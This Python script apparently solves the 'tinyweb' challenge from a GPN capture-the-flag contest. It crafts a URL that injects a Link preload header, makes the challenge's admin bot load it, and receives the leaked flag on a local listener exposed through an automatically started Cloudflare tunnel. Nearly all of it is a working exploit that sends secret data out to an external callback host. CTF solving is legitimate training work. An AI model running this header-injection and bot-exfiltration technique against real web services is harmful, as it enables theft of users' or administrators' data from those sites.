#!/usr/bin/env python3
import argparse
import http.server
import os
import platform
import queue
import re
import shutil
import signal
import socketserver
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from http import HTTPStatus

FLAG_RE = re.compile(r"GPNCTF\{[^}\r\n]+\}")
TUNNEL_URL_RE = re.compile(r"https://[-a-zA-Z0-9.]+\.trycloudflare\.com")

class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True

class CaptureHandler(http.server.BaseHTTPRequestHandler):
    seen = []

    def do_GET(self):
        CaptureHandler.seen.append((self.path, dict(self.headers)))
        self.send_response(HTTPStatus.OK)
        self.send_header("content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        print(f"[callback] {self.address_string()} {fmt % args}")

def make_bot_url(callback_base):
    callback_base = callback_base.rstrip('/') + '/leak?x='
    injection = f">;rel=preload;as=fetch,<{callback_base}"
    encoded = urllib.parse.quote(injection, safe="")
    # trailing slash is important: fetch('flag=...') resolves below this directory.
    return f"http://localhost:8080/{encoded}/"

def get(url, timeout=60):
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "tinyweb-solver"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, dict(r.headers), r.read().decode(errors="replace")

def start_listener(port):
    srv = ThreadingTCPServer(("0.0.0.0", port), CaptureHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[+] local callback listener on 0.0.0.0:{port}")
    return srv

def _reader_thread(stream, outq, prefix):
    for raw in iter(stream.readline, ''):
        line = raw.rstrip('\n')
        if line:
            print(f"[{prefix}] {line}")
            outq.put(line)
    try:
        stream.close()
    except Exception:
        pass

def install_cloudflared_local(dest_dir="."):
    """Download a local cloudflared binary when it is missing. Linux amd64/arm64 only."""
    system = platform.system().lower()
    machine = platform.machine().lower()
    if system != "linux":
        raise SystemExit("[-] --auto-install-cloudflared currently supports Linux only")
    if machine in ("x86_64", "amd64"):
        arch = "amd64"
    elif machine in ("aarch64", "arm64"):
        arch = "arm64"
    else:
        raise SystemExit(f"[-] unsupported architecture for auto-install: {machine}")

    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
    dest = os.path.abspath(os.path.join(dest_dir, "cloudflared"))
    print(f"[+] cloudflared not found; downloading local binary: {url}")
    urllib.request.urlretrieve(url, dest)
    os.chmod(dest, 0o755)
    print(f"[+] saved cloudflared binary: {dest}")
    return dest

def resolve_cloudflared(cloudflared_bin="cloudflared", auto_install=False):
    exe = shutil.which(cloudflared_bin) if os.path.basename(cloudflared_bin) == cloudflared_bin else cloudflared_bin
    if exe and os.path.exists(exe):
        return exe
    if auto_install:
        return install_cloudflared_local()
    raise SystemExit(
        "[-] cloudflared not found. Install it first, pass --cloudflared-bin /path/to/cloudflared, "
        "or add --auto-install-cloudflared.\n"
        "    Kali/Debian example:\n"
        "      wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb\n"
        "      sudo dpkg -i cloudflared-linux-amd64.deb"
    )

def start_cloudflared(port, cloudflared_bin="cloudflared", timeout=45, auto_install=False):
    """Start a quick Cloudflare Tunnel and return (public_url, process)."""
    exe = resolve_cloudflared(cloudflared_bin, auto_install=auto_install)

    cmd = [exe, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"]
    print(f"[+] starting cloudflared tunnel: {' '.join(cmd)}")
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        preexec_fn=os.setsid if hasattr(os, "setsid") else None,
    )

    outq = queue.Queue()
    threading.Thread(target=_reader_thread, args=(proc.stdout, outq, "cloudflared"), daemon=True).start()

    deadline = time.time() + timeout
    public_url = None
    while time.time() < deadline:
        if proc.poll() is not None:
            raise SystemExit(f"[-] cloudflared exited early with code {proc.returncode}")
        try:
            line = outq.get(timeout=0.2)
        except queue.Empty:
            continue
        m = TUNNEL_URL_RE.search(line)
        if m:
            public_url = m.group(0)
            break

    if not public_url:
        stop_cloudflared(proc)
        raise SystemExit("[-] timeout waiting for cloudflared public trycloudflare.com URL")

    print(f"[+] cloudflared public callback: {public_url}")
    return public_url, proc

def stop_cloudflared(proc):
    if not proc or proc.poll() is not None:
        return
    print("[+] stopping cloudflared")
    try:
        if hasattr(os, "killpg"):
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        else:
            proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass

def wait_for_flag(wait_seconds):
    deadline = time.time() + wait_seconds
    while time.time() < deadline:
        blob = "\n".join(p for p, _ in CaptureHandler.seen)
        decoded_blob = urllib.parse.unquote(blob)
        flags = FLAG_RE.findall(decoded_blob)
        if flags:
            print("[+] callback log:")
            for p, h in CaptureHandler.seen:
                print(f"    GET {p}")
            print(f"[+] extracted flag: {flags[-1]}")
            print("[+] proof: flag arrived in callback URL from remote bot after /bot/run returned ok")
            return 0
        time.sleep(0.5)

    print("[-] timeout waiting for flag. Callback log so far:")
    for p, h in CaptureHandler.seen:
        print(f"    GET {p}")
    return 1

def main():
    ap = argparse.ArgumentParser(description="Remote solver for tinyweb")
    ap.add_argument("target", help="public challenge base URL, e.g. https://example.gpn24.ctf.kitctf.de")
    ap.add_argument("callback", nargs="?", help="public callback base URL. Omit when using --auto-tunnel")
    ap.add_argument("--listen", type=int, default=9901, help="local callback listener port, default: 9901")
    ap.add_argument("--auto-tunnel", action="store_true", help="start cloudflared quick tunnel automatically for --listen port")
    ap.add_argument("--cloudflared-bin", default="cloudflared", help="cloudflared binary path/name")
    ap.add_argument("--auto-install-cloudflared", action="store_true", help="download ./cloudflared automatically if missing; Linux amd64/arm64 only")
    ap.add_argument("--tunnel-timeout", type=int, default=45, help="seconds to wait for cloudflared URL")
    ap.add_argument("--no-listen", action="store_true", help="do not start a local listener; useful when callback is handled elsewhere")
    ap.add_argument("--wait", type=int, default=60, help="seconds to wait for callback when listener is used")
    args = ap.parse_args()

    if not args.callback and not args.auto_tunnel:
        args.auto_tunnel = True
        print(f"[+] no callback provided; enabling --auto-tunnel on local port {args.listen}")

    CaptureHandler.seen.clear()
    srv = None
    tunnel_proc = None

    try:
        if not args.no_listen or args.auto_tunnel:
            srv = start_listener(args.listen)

        callback = args.callback
        if args.auto_tunnel:
            callback, tunnel_proc = start_cloudflared(args.listen, args.cloudflared_bin, args.tunnel_timeout, args.auto_install_cloudflared)
        elif not args.no_listen:
            print(f"[+] make sure public callback URL forwards to local port {args.listen}: {callback}")

        target = args.target.rstrip('/')
        bot_target = make_bot_url(callback)
        run_url = f"{target}/bot/run?url={urllib.parse.quote(bot_target, safe='')}"

        print(f"[+] target:      {target}")
        print(f"[+] callback:    {callback.rstrip('/')}")
        print(f"[+] bot target:  {bot_target}")
        print(f"[+] trigger URL: {run_url}")

        status, headers, body = get(run_url)
        print(f"[+] /bot/run HTTP {status}")
        print(f"[+] /bot/run body: {body.strip()!r}")

        if args.no_listen and not args.auto_tunnel:
            print("[!] no local listener; check your external callback logs for /leak?x=/flag=GPNCTF{...}")
            return 0
        return wait_for_flag(args.wait)
    finally:
        stop_cloudflared(tunnel_proc)
        if srv:
            srv.shutdown()
            srv.server_close()

if __name__ == "__main__":
    raise SystemExit(main())
